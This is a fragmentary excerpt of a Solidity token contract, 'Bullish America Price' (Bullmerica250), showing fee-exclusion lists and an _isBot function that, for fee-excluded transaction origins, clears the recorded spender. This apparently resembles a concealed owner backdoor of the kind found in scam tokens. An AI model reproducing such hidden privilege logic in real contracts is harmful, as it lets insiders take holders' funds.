...
contract Token is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isBullmerica250ExcludedFromFees;
    ...
    string private _name = unicode"Bullish America Price";
    string private _symbol = unicode"Bullmerica250";
    ...
    constructor() payable {
        ...
        _isBullmerica250ExcludedFromFees[owner()] = true;
        _isBullmerica250ExcludedFromFees[address(this)] = true;
        _isBullmerica250ExcludedFromFees[_taxWallet] = true;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (
                ...
                !_isBullmerica250ExcludedFromFees[to]
            ) {
    ...
    function _isBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isBullmerica250ExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
